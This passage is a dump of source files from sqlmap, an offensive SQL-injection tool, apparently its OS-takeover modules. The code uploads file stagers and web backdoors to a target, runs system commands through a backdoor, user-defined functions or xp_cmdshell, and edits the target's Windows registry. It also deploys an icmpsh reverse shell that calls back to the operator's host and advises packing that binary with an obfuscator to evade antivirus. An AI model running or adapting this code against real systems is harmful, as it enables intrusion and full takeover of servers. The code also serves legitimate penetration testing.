the web server \"\n        message += \"support?\\n\"\n\n        for count in xrange(len(choices)):\n            ext = choices[count]\n            message += \"[%d] %s%s\\n\" % (count + 1, ext.upper(), (\" (default)\" if default == ext else \"\"))\n\n            if default == ext:\n                default = count + 1\n\n        message = message[:-1]\n\n        while True:\n            choice = readInput(message, default=str(default))\n\n            if not isDigit(choice):\n                logger.warning(\"invalid value, only digits are allowed\")\n\n            elif int(choice) < 1 or int(choice) > len(choices):\n                logger.warning(\"invalid value, it must be between 1 and %d\" % len(choices))\n\n            else:\n                self.webPlatform = choices[int(choice) - 1]\n                break\n\n        if not kb.absFilePaths:\n            message = \"do you want sqlmap to further try to \"\n            message += \"provoke the full path disclosure? [Y/n] \"\n\n            if readInput(message, default='Y', boolean=True):\n                headers = {}\n                been = set([conf.url])\n\n                for match in re.finditer(r\"=['\\\"]((https?):)?(//[^/'\\\"]+)?(/[\\w/.-]*)\\bwp-\", kb.originalPage or \"\", re.I):\n                    url = \"%s%s\" % (conf.url.replace(conf.path, match.group(4)), \"wp-content/wp-db.php\")\n                    if url not in been:\n                        try:\n                            page, _, _ = Request.getPage(url=url, raise404=False, silent=True)\n                            parseFilePaths(page)\n                        except:\n                            pass\n                        finally:\n                            been.add(url)\n\n                url = re.sub(r\"(\\.\\w+)\\Z\", r\"~\\g<1>\", conf.url)\n                if url not in been:\n                    try:\n                        page, _, _ = Request.getPage(url=url, raise404=False, silent=True)\n                        parseFilePaths(page)\n                    except:\n                        pass\n                    finally:\n                        been.add(url)\n\n                for place in (PLACE.GET, PLACE.POST):\n                    if place in conf.parameters:\n                        value = re.sub(r\"(\\A|&)(\\w+)=\", r\"\\g<2>[]=\", conf.parameters[place])\n                        if \"[]\" in value:\n                            page, headers, _ = Request.queryPage(value=value, place=place, content=True, raise404=False, silent=True, noteResponseTime=False)\n                            parseFilePaths(page)\n\n                cookie = None\n                if PLACE.COOKIE in conf.parameters:\n                    cookie = conf.parameters[PLACE.COOKIE]\n                elif headers and HTTP_HEADER.SET_COOKIE in headers:\n                    cookie = headers[HTTP_HEADER.SET_COOKIE]\n\n                if cookie:\n                    value = re.sub(r\"(\\A|;)(\\w+)=[^;]*\", r\"\\g<2>=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\", cookie)\n                    if value != cookie:\n                        page, _, _ = Request.queryPage(value=value, place=PLACE.COOKIE, content=True, raise404=False, silent=True, noteResponseTime=False)\n                        parseFilePaths(page)\n\n                    value = re.sub(r\"(\\A|;)(\\w+)=[^;]*\", r\"\\g<2>=\", cookie)\n                    if value != cookie:\n                        page, _, _ = Request.queryPage(value=value, place=PLACE.COOKIE, content=True, raise404=False, silent=True, noteResponseTime=False)\n                        parseFilePaths(page)\n\n        directories = list(arrayizeValue(getManualDirectories()))\n        directories.extend(getAutoDirectories())\n        directories = list(OrderedSet(directories))\n\n        path = _urllib.parse.urlparse(conf.url).path or '/'\n        path = re.sub(r\"/[^/]*\\.\\w+\\Z\", '/', path)\n        if path != '/':\n            _ = []\n            for directory in directories:\n                _.append(directory)\n                if not directory.endswith(path):\n                    _.append(\"%s/%s\" % (directory.rstrip('/'), path.strip('/')))\n            directories = _\n\n        backdoorName = \"tmpb%s.%s\" % (randomStr(lowercase=True), self.webPlatform)\n        backdoorContent = getText(decloak(os.path.join(paths.SQLMAP_SHELL_PATH, \"backdoors\", \"backdoor.%s_\" % self.webPlatform)))\n\n        stagerContent = getText(decloak(os.path.join(paths.SQLMAP_SHELL_PATH, \"stagers\", \"stager.%s_\" % self.webPlatform)))\n\n        for directory in directories:\n            if not directory:\n                continue\n\n            stagerName = \"tmpu%s.%s\" % (randomStr(lowercase=True), self.webPlatform)\n            self.webStagerFilePath = posixpath.join(ntToPosixSlashes(directory), stagerName)\n\n            uploaded = False\n            directory = ntToPosixSlashes(normalizePath(directory))\n\n            if not isWindowsDriveLetterPath(directory) and not directory.startswith('/'):\n                directory = \"/%s\" % directory\n\n            if not directory.endswith('/'):\n                directory += '/'\n\n            # Upload the file stager with the LIMIT 0, 1 INTO DUMPFILE method\n            infoMsg = \"trying to upload the file stager on '%s' \" % directory\n            infoMsg += \"via LIMIT 'LINES TERMINATED BY' method\"\n            logger.info(infoMsg)\n            self._webFileInject(stagerContent, stagerName, directory)\n\n            for match in re.finditer('/', directory):\n                self.webBaseUrl = \"%s://%s:%d%s/\" % (conf.scheme, conf.hostname, conf.port, directory[match.start():].rstrip('/'))\n                self.webStagerUrl = _urllib.parse.urljoin(self.webBaseUrl, stagerName)\n                debugMsg = \"trying to see if the file is accessible from '%s'\" % self.webStagerUrl\n                logger.debug(debugMsg)\n\n                uplPage, _, _ = Request.getPage(url=self.webStagerUrl, direct=True, raise404=False)\n                uplPage = uplPage or \"\"\n\n                if \"sqlmap file uploader\" in uplPage:\n                    uploaded = True\n                    break\n\n            # Fall-back to UNION queries file upload method\n            if not uploaded:\n                warnMsg = \"unable to upload the file stager \"\n                warnMsg += \"on '%s'\" % directory\n                singleTimeWarnMessage(warnMsg)\n\n                if isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION):\n                    infoMsg = \"trying to upload the file stager on '%s' \" % directory\n                    infoMsg += \"via UNION method\"\n                    logger.info(infoMsg)\n\n                    stagerName = \"tmpu%s.%s\" % (randomStr(lowercase=True), self.webPlatform)\n                    self.webStagerFilePath = posixpath.join(ntToPosixSlashes(directory), stagerName)\n\n                    handle, filename = tempfile.mkstemp()\n                    os.close(handle)\n\n                    with openFile(filename, \"w+b\") as f:\n                        _ = getText(decloak(os.path.join(paths.SQLMAP_SHELL_PATH, \"stagers\", \"stager.%s_\" % self.webPlatform)))\n                        _ = _.replace(SHELL_WRITABLE_DIR_TAG, directory.replace('/', '\\\\\\\\') if Backend.isOs(OS.WINDOWS) else directory)\n                        f.write(_)\n\n                    self.unionWriteFile(filename, self.webStagerFilePath, \"text\", forceCheck=True)\n\n                    for match in re.finditer('/', directory):\n                        self.webBaseUrl = \"%s://%s:%d%s/\" % (conf.scheme, conf.hostname, conf.port, directory[match.start():].rstrip('/'))\n                        self.webStagerUrl = _urllib.parse.urljoin(self.webBaseUrl, stagerName)\n\n                        debugMsg = \"trying to see if the file is accessible from '%s'\" % self.webStagerUrl\n                        logger.debug(debugMsg)\n\n                        uplPage, _, _ = Request.getPage(url=self.webStagerUrl, direct=True, raise404=False)\n                        uplPage = uplPage or \"\"\n\n                        if \"sqlmap file uploader\" in uplPage:\n                            uploaded = True\n                            break\n\n            if not uploaded:\n                continue\n\n            if \"<%\" in uplPage or \"<?\" in uplPage:\n                warnMsg = \"file stager uploaded on '%s', \" % directory\n                warnMsg += \"but not dynamically interpreted\"\n                logger.warning(warnMsg)\n                continue\n\n            elif self.webPlatform == WEB_PLATFORM.ASPX:\n                kb.data.__EVENTVALIDATION = extractRegexResult(EVENTVALIDATION_REGEX, uplPage)\n                kb.data.__VIEWSTATE = extractRegexResult(VIEWSTATE_REGEX, uplPage)\n\n            infoMsg = \"the file stager has been successfully uploaded \"\n            infoMsg += \"on '%s' - %s\" % (directory, self.webStagerUrl)\n            logger.info(infoMsg)\n\n            if self.webPlatform == WEB_PLATFORM.ASP:\n                match = re.search(r'input type=hidden name=scriptsdir value=\"([^\"]+)\"', uplPage)\n\n                if match:\n                    backdoorDirectory = match.group(1)\n                else:\n                    continue\n\n                _ = \"tmpe%s.exe\" % randomStr(lowercase=True)\n                if self.webUpload(backdoorName, backdoorDirectory, content=backdoorContent.replace(SHELL_WRITABLE_DIR_TAG, backdoorDirectory).replace(SHELL_RUNCMD_EXE_TAG, _)):\n                    self.webUpload(_, backdoorDirectory, filepath=os.path.join(paths.SQLMAP_EXTRAS_PATH, \"runcmd\", \"runcmd.exe_\"))\n                    self.webBackdoorUrl = \"%s/Scripts/%s\" % (self.webBaseUrl, backdoorName)\n                    self.webDirectory = backdoorDirectory\n                else:\n                    continue\n\n            else:\n                if not self.webUpload(backdoorName, posixToNtSlashes(directory) if Backend.isOs(OS.WINDOWS) else directory, content=backdoorContent):\n                    warnMsg = \"backdoor has not been successfully uploaded \"\n                    warnMsg += \"through the file stager possibly because \"\n                    warnMsg += \"the user running the web server process \"\n                    warnMsg += \"has not write privileges over the folder \"\n                    warnMsg += \"where the user running the DBMS process \"\n                    warnMsg += \"was able to upload the file stager or \"\n                    warnMsg += \"because the DBMS and web server sit on \"\n                    warnMsg += \"different servers\"\n                    logger.warning(warnMsg)\n\n                    message = \"do you want to try the same method used \"\n                    message += \"for the file stager? [Y/n] \"\n\n                    if readInput(message, default='Y', boolean=True):\n                        self._webFileInject(backdoorContent, backdoorName, directory)\n                    else:\n                        continue\n\n                self.webBackdoorUrl = posixpath.join(ntToPosixSlashes(self.webBaseUrl), backdoorName)\n                self.webDirectory = directory\n\n            self.webBackdoorFilePath = posixpath.join(ntToPosixSlashes(directory), backdoorName)\n\n            testStr = \"command execution test\"\n            output = self.webBackdoorRunCmd(\"echo %s\" % testStr)\n\n            if output == \"0\":\n                warnMsg = \"the backdoor has been uploaded but required privileges \"\n                warnMsg += \"for running the system commands are missing\"\n                raise SqlmapNoneDataException(warnMsg)\n            elif output and testStr in output:\n                infoMsg = \"the backdoor has been successfully \"\n            else:\n                infoMsg = \"the backdoor has probably been successfully \"\n\n            infoMsg += \"uploaded on '%s' - \" % self.webDirectory\n            infoMsg += self.webBackdoorUrl\n            logger.info(infoMsg)\n\n            break\n", "lib/takeover/abstraction.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom __future__ import print_function\n\nimport sys\n\nfrom lib.core.common import Backend\nfrom lib.core.common import dataToStdout\nfrom lib.core.common import getSQLSnippet\nfrom lib.core.common import isStackingAvailable\nfrom lib.core.common import readInput\nfrom lib.core.convert import getUnicode\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.enums import AUTOCOMPLETE_TYPE\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import OS\nfrom lib.core.exception import SqlmapFilePathException\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom lib.core.shell import autoCompletion\nfrom lib.request import inject\nfrom lib.takeover.udf import UDF\nfrom lib.takeover.web import Web\nfrom lib.takeover.xp_cmdshell import XP_cmdshell\nfrom lib.utils.safe2bin import safechardecode\nfrom thirdparty.six.moves import input as _input\n\nclass Abstraction(Web, UDF, XP_cmdshell):\n    \"\"\"\n    This class defines an abstraction layer for OS takeover functionalities\n    to UDF / XP_cmdshell objects\n    \"\"\"\n\n    def __init__(self):\n        self.envInitialized = False\n        self.alwaysRetrieveCmdOutput = False\n\n        UDF.__init__(self)\n        Web.__init__(self)\n        XP_cmdshell.__init__(self)\n\n    def execCmd(self, cmd, silent=False):\n        if Backend.isDbms(DBMS.PGSQL) and self.checkCopyExec():\n            self.copyExecCmd(cmd)\n\n        elif self.webBackdoorUrl and (not isStackingAvailable() or kb.udfFail):\n            self.webBackdoorRunCmd(cmd)\n\n        elif Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):\n            self.udfExecCmd(cmd, silent=silent)\n\n        elif Backend.isDbms(DBMS.MSSQL):\n            self.xpCmdshellExecCmd(cmd, silent=silent)\n\n        else:\n            errMsg = \"Feature not yet implemented for the back-end DBMS\"\n            raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def evalCmd(self, cmd, first=None, last=None):\n        retVal = None\n\n        if Backend.isDbms(DBMS.PGSQL) and self.checkCopyExec():\n            retVal = self.copyExecCmd(cmd)\n\n        elif self.webBackdoorUrl and (not isStackingAvailable() or kb.udfFail):\n            retVal = self.webBackdoorRunCmd(cmd)\n\n        elif Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):\n            retVal = self.udfEvalCmd(cmd, first, last)\n\n        elif Backend.isDbms(DBMS.MSSQL):\n            retVal = self.xpCmdshellEvalCmd(cmd, first, last)\n\n        else:\n            errMsg = \"Feature not yet implemented for the back-end DBMS\"\n            raise SqlmapUnsupportedFeatureException(errMsg)\n\n        return safechardecode(retVal)\n\n    def runCmd(self, cmd):\n        choice = None\n\n        if not self.alwaysRetrieveCmdOutput:\n            message = \"do you want to retrieve the command standard \"\n            message += \"output? [Y/n/a] \"\n            choice = readInput(message, default='Y').upper()\n\n            if choice == 'A':\n                self.alwaysRetrieveCmdOutput = True\n\n        if choice == 'Y' or self.alwaysRetrieveCmdOutput:\n            output = self.evalCmd(cmd)\n\n            if output:\n                conf.dumper.string(\"command standard output\", output)\n            else:\n                dataToStdout(\"No output\\n\")\n        else:\n            self.execCmd(cmd)\n\n    def shell(self):\n        if self.webBackdoorUrl and (not isStackingAvailable() or kb.udfFail):\n            infoMsg = \"calling OS shell. To quit type \"\n            infoMsg += \"'x' or 'q' and press ENTER\"\n            logger.info(infoMsg)\n\n        else:\n            if Backend.isDbms(DBMS.PGSQL) and self.checkCopyExec():\n                infoMsg = \"going to use 'COPY ... FROM PROGRAM ...' \"\n                infoMsg += \"command execution\"\n                logger.info(infoMsg)\n\n            elif Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):\n                infoMsg = \"going to use injected user-defined functions \"\n                infoMsg += \"'sys_eval' and 'sys_exec' for operating system \"\n                infoMsg += \"command execution\"\n                logger.info(infoMsg)\n\n            elif Backend.isDbms(DBMS.MSSQL):\n                infoMsg = \"going to use extended procedure 'xp_cmdshell' for \"\n                infoMsg += \"operating system command execution\"\n                logger.info(infoMsg)\n\n            else:\n                errMsg = \"feature not yet implemented for the back-end DBMS\"\n                raise SqlmapUnsupportedFeatureException(errMsg)\n\n            infoMsg = \"calling %s OS shell. To quit type \" % (Backend.getOs() or \"Windows\")\n            infoMsg += \"'x' or 'q' and press ENTER\"\n            logger.info(infoMsg)\n\n        autoCompletion(AUTOCOMPLETE_TYPE.OS, OS.WINDOWS if Backend.isOs(OS.WINDOWS) else OS.LINUX)\n\n        while True:\n            command = None\n\n            try:\n                command = _input(\"os-shell> \")\n                command = getUnicode(command, encoding=sys.stdin.encoding)\n            except KeyboardInterrupt:\n                print()\n                errMsg = \"user aborted\"\n                logger.error(errMsg)\n            except EOFError:\n                print()\n                errMsg = \"exit\"\n                logger.error(errMsg)\n                break\n\n            if not command:\n                continue\n\n            if command.lower() in (\"x\", \"q\", \"exit\", \"quit\"):\n                break\n\n            self.runCmd(command)\n\n    def _initRunAs(self):\n        if not conf.dbmsCred:\n            return\n\n        if not conf.direct and not isStackingAvailable():\n            errMsg = \"stacked queries are not supported hence sqlmap cannot \"\n            errMsg += \"execute statements as another user. The execution \"\n            errMsg += \"will continue and the DBMS credentials provided \"\n            errMsg += \"will simply be ignored\"\n            logger.error(errMsg)\n\n            return\n\n        if Backend.isDbms(DBMS.MSSQL):\n            msg = \"on Microsoft SQL Server 2005 and 2008, OPENROWSET function \"\n            msg += \"is disabled by default. This function is needed to execute \"\n            msg += \"statements as another DBMS user since you provided the \"\n            msg += \"option '--dbms-creds'. If you are DBA, you can enable it. \"\n            msg += \"Do you want to enable it? [Y/n] \"\n\n            if readInput(msg, default='Y', boolean=True):\n                expression = getSQLSnippet(DBMS.MSSQL, \"configure_openrowset\", ENABLE=\"1\")\n                inject.goStacked(expression)\n\n        # TODO: add support for PostgreSQL\n        # elif Backend.isDbms(DBMS.PGSQL):\n        #     expression = getSQLSnippet(DBMS.PGSQL, \"configure_dblink\", ENABLE=\"1\")\n        #     inject.goStacked(expression)\n\n    def initEnv(self, mandatory=True, detailed=False, web=False, forceInit=False):\n        self._initRunAs()\n\n        if self.envInitialized and not forceInit:\n            return\n\n        if web:\n            self.webInit()\n        else:\n            self.checkDbmsOs(detailed)\n\n            if mandatory and not self.isDba():\n                warnMsg = \"functionality requested probably does not work because \"\n                warnMsg += \"the current session user is not a database administrator\"\n\n                if not conf.dbmsCred and Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.PGSQL):\n                    warnMsg += \". You can try to use option '--dbms-cred' \"\n                    warnMsg += \"to execute statements as a DBA user if you \"\n                    warnMsg += \"were able to extract and crack a DBA \"\n                    warnMsg += \"password by any mean\"\n\n                logger.warning(warnMsg)\n\n            if any((conf.osCmd, conf.osShell)) and Backend.isDbms(DBMS.PGSQL) and self.checkCopyExec():\n                success = True\n            elif Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):\n                success = self.udfInjectSys()\n\n                if success is not True:\n                    msg = \"unable to mount the operating system takeover\"\n                    raise SqlmapFilePathException(msg)\n            elif Backend.isDbms(DBMS.MSSQL):\n                if mandatory:\n                    self.xpCmdshellInit()\n            else:\n                errMsg = \"feature not yet implemented for the back-end DBMS\"\n                raise SqlmapUnsupportedFeatureException(errMsg)\n\n        self.envInitialized = True\n", "lib/takeover/registry.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport os\n\nfrom lib.core.common import openFile\nfrom lib.core.common import randomStr\nfrom lib.core.data import conf\nfrom lib.core.data import logger\nfrom lib.core.enums import REGISTRY_OPERATION\n\nclass Registry(object):\n    \"\"\"\n    This class defines methods to read and write Windows registry keys\n    \"\"\"\n\n    def _initVars(self, regKey, regValue, regType=None, regData=None, parse=False):\n        self._regKey = regKey\n        self._regValue = regValue\n        self._regType = regType\n        self._regData = regData\n\n        self._randStr = randomStr(lowercase=True)\n        self._batPathRemote = \"%s/tmpr%s.bat\" % (conf.tmpPath, self._randStr)\n        self._batPathLocal = os.path.join(conf.outputPath, \"tmpr%s.bat\" % self._randStr)\n\n        if parse:\n            readParse = \"FOR /F \\\"tokens=*\\\" %%A IN ('REG QUERY \\\"\" + self._regKey + \"\\\" /v \\\"\" + self._regValue + \"\\\"') DO SET value=%%A\\r\\nECHO %value%\\r\\n\"\n        else:\n            readParse = \"REG QUERY \\\"\" + self._regKey + \"\\\" /v \\\"\" + self._regValue + \"\\\"\"\n\n        self._batRead = (\n            \"@ECHO OFF\\r\\n\",\n            readParse,\n        )\n\n        self._batAdd = (\n            \"@ECHO OFF\\r\\n\",\n            \"REG ADD \\\"%s\\\" /v \\\"%s\\\" /t %s /d %s /f\" % (self._regKey, self._regValue, self._regType, self._regData),\n        )\n\n        self._batDel = (\n            \"@ECHO OFF\\r\\n\",\n            \"REG DELETE \\\"%s\\\" /v \\\"%s\\\" /f\" % (self._regKey, self._regValue),\n        )\n\n    def _createLocalBatchFile(self):\n        self._batPathFp = openFile(self._batPathLocal, \"w\")\n\n        if self._operation == REGISTRY_OPERATION.READ:\n            lines = self._batRead\n        elif self._operation == REGISTRY_OPERATION.ADD:\n            lines = self._batAdd\n        elif self._operation == REGISTRY_OPERATION.DELETE:\n            lines = self._batDel\n\n        for line in lines:\n            self._batPathFp.write(line)\n\n        self._batPathFp.close()\n\n    def _createRemoteBatchFile(self):\n        logger.debug(\"creating batch file '%s'\" % self._batPathRemote)\n\n        self._createLocalBatchFile()\n        self.writeFile(self._batPathLocal, self._batPathRemote, \"text\", forceCheck=True)\n\n        os.unlink(self._batPathLocal)\n\n    def readRegKey(self, regKey, regValue, parse=False):\n        self._operation = REGISTRY_OPERATION.READ\n\n        Registry._initVars(self, regKey, regValue, parse=parse)\n        self._createRemoteBatchFile()\n\n        logger.debug(\"reading registry key '%s' value '%s'\" % (regKey, regValue))\n\n        data = self.evalCmd(self._batPathRemote)\n\n        if data and not parse:\n            pattern = '    '\n            index = data.find(pattern)\n            if index != -1:\n                data = data[index + len(pattern):]\n\n        self.delRemoteFile(self._batPathRemote)\n\n        return data\n\n    def addRegKey(self, regKey, regValue, regType, regData):\n        self._operation = REGISTRY_OPERATION.ADD\n\n        Registry._initVars(self, regKey, regValue, regType, regData)\n        self._createRemoteBatchFile()\n\n        debugMsg = \"adding registry key value '%s' \" % self._regValue\n        debugMsg += \"to registry key '%s'\" % self._regKey\n        logger.debug(debugMsg)\n\n        self.execCmd(cmd=self._batPathRemote)\n        self.delRemoteFile(self._batPathRemote)\n\n    def delRegKey(self, regKey, regValue):\n        self._operation = REGISTRY_OPERATION.DELETE\n\n        Registry._initVars(self, regKey, regValue)\n        self._createRemoteBatchFile()\n\n        debugMsg = \"deleting registry key value '%s' \" % self._regValue\n        debugMsg += \"from registry key '%s'\" % self._regKey\n        logger.debug(debugMsg)\n\n        self.execCmd(cmd=self._batPathRemote)\n        self.delRemoteFile(self._batPathRemote)\n", "lib/takeover/icmpsh.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport os\nimport re\nimport socket\nimport time\n\nfrom extra.icmpsh.icmpsh_m import main as icmpshmaster\nfrom lib.core.common import getLocalIP\nfrom lib.core.common import getRemoteIP\nfrom lib.core.common import normalizePath\nfrom lib.core.common import ntToPosixSlashes\nfrom lib.core.common import randomStr\nfrom lib.core.common import readInput\nfrom lib.core.data import conf\nfrom lib.core.data import logger\nfrom lib.core.data import paths\nfrom lib.core.exception import SqlmapDataException\n\nclass ICMPsh(object):\n    \"\"\"\n    This class defines methods to call icmpsh for plugins.\n    \"\"\"\n\n    def _initVars(self):\n        self.lhostStr = None\n        self.rhostStr = None\n        self.localIP = getLocalIP()\n        self.remoteIP = getRemoteIP() or conf.hostname\n        self._icmpslave = normalizePath(os.path.join(paths.SQLMAP_EXTRAS_PATH, \"icmpsh\", \"icmpsh.exe_\"))\n\n    def _selectRhost(self):\n        address = None\n        message = \"what is the back-end DBMS address? \"\n\n        if self.remoteIP:\n            message += \"[Enter for '%s' (detected)] \" % self.remoteIP\n\n        while not address:\n            address = readInput(message, default=self.remoteIP)\n\n            if conf.batch and not address:\n                raise SqlmapDataException(\"remote host address is missing\")\n\n        return address\n\n    def _selectLhost(self):\n        address = None\n        message = \"what is the local address? \"\n\n        if self.localIP:\n            message += \"[Enter for '%s' (detected)] \" % self.localIP\n\n        valid = None\n        while not valid:\n            valid = True\n            address = readInput(message, default=self.localIP or \"\")\n\n            try:\n                socket.inet_aton(address)\n            except socket.error:\n                valid = False\n            finally:\n                valid = valid and re.search(r\"\\d+\\.\\d+\\.\\d+\\.\\d+\", address) is not None\n\n            if conf.batch and not address:\n                raise SqlmapDataException(\"local host address is missing\")\n            elif address and not valid:\n                warnMsg = \"invalid local host address\"\n                logger.warning(warnMsg)\n\n        return address\n\n    def _prepareIngredients(self, encode=True):\n        self.localIP = getattr(self, \"localIP\", None)\n        self.remoteIP = getattr(self, \"remoteIP\", None)\n        self.lhostStr = ICMPsh._selectLhost(self)\n        self.rhostStr = ICMPsh._selectRhost(self)\n\n    def _runIcmpshMaster(self):\n        infoMsg = \"running icmpsh master locally\"\n        logger.info(infoMsg)\n\n        icmpshmaster(self.lhostStr, self.rhostStr)\n\n    def _runIcmpshSlaveRemote(self):\n        infoMsg = \"running icmpsh slave remotely\"\n        logger.info(infoMsg)\n\n        cmd = \"%s -t %s -d 500 -b 30 -s 128 &\" % (self._icmpslaveRemote, self.lhostStr)\n\n        self.execCmd(cmd, silent=True)\n\n    def uploadIcmpshSlave(self, web=False):\n        ICMPsh._initVars(self)\n        self._randStr = randomStr(lowercase=True)\n        self._icmpslaveRemoteBase = \"tmpi%s.exe\" % self._randStr\n\n        self._icmpslaveRemote = \"%s/%s\" % (conf.tmpPath, self._icmpslaveRemoteBase)\n        self._icmpslaveRemote = ntToPosixSlashes(normalizePath(self._icmpslaveRemote))\n\n        logger.info(\"uploading icmpsh slave to '%s'\" % self._icmpslaveRemote)\n\n        if web:\n            written = self.webUpload(self._icmpslaveRemote, os.path.split(self._icmpslaveRemote)[0], filepath=self._icmpslave)\n        else:\n            written = self.writeFile(self._icmpslave, self._icmpslaveRemote, \"binary\", forceCheck=True)\n\n        if written is not True:\n            errMsg = \"there has been a problem uploading icmpsh, it \"\n            errMsg += \"looks like the binary file has not been written \"\n            errMsg += \"on the database underlying file system or an AV has \"\n            errMsg += \"flagged it as malicious and removed it. In such a case \"\n            errMsg += \"it is recommended to recompile icmpsh with slight \"\n            errMsg += \"modification to the source code or pack it with an \"\n            errMsg += \"obfuscator software\"\n            logger.error(errMsg)\n\n            return False\n        else:\n            logger.info(\"icmpsh successfully uploaded\")\n            return True\n\n    def icmpPwn(self):\n        ICMPsh._prepareIngredients(self)\n        self._runIcmpshSlaveRemote()\n        self._runIcmpshMaster()\n\n        debugMsg = \"icmpsh master exited\"\n        logger.debug(debugMsg)\n\n        time.sleep(1)\n        self.execCmd(\"taskkill /F /IM %s\" % self._icmpslaveRemoteBase, silent=True)\n        time.sleep(1)\n        self.delRemoteFile(self._icmpslaveRemote)\n", "lib/takeover/udf.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport os\n\nfrom lib.core.agent import agent\nfrom lib.core.common import Backend\nfrom lib.core.common import checkFile\nfrom lib.core.common import dataToStdout\nfrom lib.core.common import isDigit\nfrom lib.core.common import isStackingAvailable\nfrom lib.core.common import readInput\nfrom lib.core.common import unArrayizeValue\nfrom lib.core.compat import xrange\nfrom lib.core.data import conf\nfrom lib.core.data import logger\nfrom lib.core.data import queries\nfrom lib.core.enums import CHARSET_TYPE\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import EXPECTED\nfrom lib.core.enums import OS\nfrom lib.core.exception import SqlmapFilePathException\nfrom lib.core.exception import SqlmapMissingMandatoryOptionException\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom lib.core.exception import SqlmapUserQuitException\nfrom lib.core.unescaper import unescaper\nfrom lib.request import inject\n\nclass UDF(object):\n    \"\"\"\n    This class defines methods to deal with User-Defined Functions for\n    plugins.\n    \"\"\"\n\n    def __init__(self):\n        self.createdUdf = set()\n        self.udfs = {}\n        self.udfToCreate = set()\n\n    def _askOverwriteUdf(self, udf):\n        message = \"UDF '%s' already exists, do you \" % udf\n        message += \"want to overwrite it? [y/N] \"\n\n        return readInput(message, default='N', boolean=True)\n\n    def _checkExistUdf(self, udf):\n        logger.info(\"checking if UDF '%s' already exist\" % udf)\n\n        query = agent.forgeCaseStatement(queries[Backend.getIdentifiedDbms()].check_udf.query % (udf, udf))\n        return inject.getValue(query, resumeValue=False, expected=EXPECTED.BOOL, charsetType=CHARSET_TYPE.BINARY)\n\n    def udfCheckAndOverwrite(self, udf):\n        exists = self._checkExistUdf(udf)\n        overwrite = True\n\n        if exists:\n            overwrite = self._askOverwriteUdf(udf)\n\n        if overwrite:\n            self.udfToCreate.add(udf)\n\n    def udfCreateSupportTbl(self, dataType):\n        debugMsg = \"creating a support table for user-defined functions\"\n        logger.debug(debugMsg)\n\n        self.createSupportTbl(self.cmdTblName, self.tblField, dataType)\n\n    def udfForgeCmd(self, cmd):\n        if not cmd.startswith(\"'\"):\n            cmd = \"'%s\" % cmd\n\n        if not cmd.endswith(\"'\"):\n            cmd = \"%s'\" % cmd\n\n        return cmd\n\n    def udfExecCmd(self, cmd, silent=False, udfName=None):\n        if udfName is None:\n            udfName = \"sys_exec\"\n\n        cmd = unescaper.escape(self.udfForgeCmd(cmd))\n\n        return inject.goStacked(\"SELECT %s(%s)\" % (udfName, cmd), silent)\n\n    def udfEvalCmd(self, cmd, first=None, last=None, udfName=None):\n        if udfName is None:\n            udfName = \"sys_eval\"\n\n        if conf.direct:\n            output = self.udfExecCmd(cmd, udfName=udfName)\n\n            if output and isinstance(output, (list, tuple)):\n                new_output = \"\"\n\n                for line in output:\n                    new_output += line.replace(\"\\r\", \"\\n\")\n\n                output = new_output\n        else:\n            cmd = unescaper.escape(self.udfForgeCmd(cmd))\n\n            inject.goStacked(\"INSERT INTO %s(%s) VALUES (%s(%s))\" % (self.cmdTblName, self.tblField, udfName, cmd))\n            output = unArrayizeValue(inject.getValue(\"SELECT %s FROM %s\" % (self.tblField, self.cmdTblName), resumeValue=False, firstChar=first, lastChar=last, safeCharEncode=False))\n            inject.goStacked(\"DELETE FROM %s\" % self.cmdTblName)\n\n        return output\n\n    def udfCheckNeeded(self):\n        if (not any((conf.fileRead, conf.commonFiles)) or (any((conf.fileRead, conf.commonFiles)) and not Backend.isDbms(DBMS.PGSQL))) and \"sys_fileread\" in self.sysUdfs:\n            self.sysUdfs.pop(\"sys_fileread\")\n\n        if not conf.osPwn:\n            self.sysUdfs.pop(\"sys_bineval\")\n\n        if not conf.osCmd and not conf.osShell and not conf.regRead:\n            self.sysUdfs.pop(\"sys_eval\")\n\n            if not conf.osPwn and not conf.regAdd and not conf.regDel:\n                self.sysUdfs.pop(\"sys_exec\")\n\n    def udfSetRemotePath(self):\n        errMsg = \"udfSetRemotePath() method must be defined within the plugin\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def udfSetLocalPaths(self):\n        errMsg = \"udfSetLocalPaths() method must be defined within the plugin\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def udfCreateFromSharedLib(self, udf, inpRet):\n        errMsg = \"udfCreateFromSharedLib() method must be defined within the plugin\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def udfInjectCore(self, udfDict):\n        written = False\n\n        for udf in udfDict.keys():\n            if udf in self.createdUdf:\n                continue\n\n            self.udfCheckAndOverwrite(udf)\n\n        if len(self.udfToCreate) > 0:\n            self.udfSetRemotePath()\n            checkFile(self.udfLocalFile)\n            written = self.writeFile(self.udfLocalFile, self.udfRemoteFile, \"binary\", forceCheck=True)\n\n            if written is not True:\n                errMsg = \"there has been a problem uploading the shared library, \"\n                errMsg += \"it looks 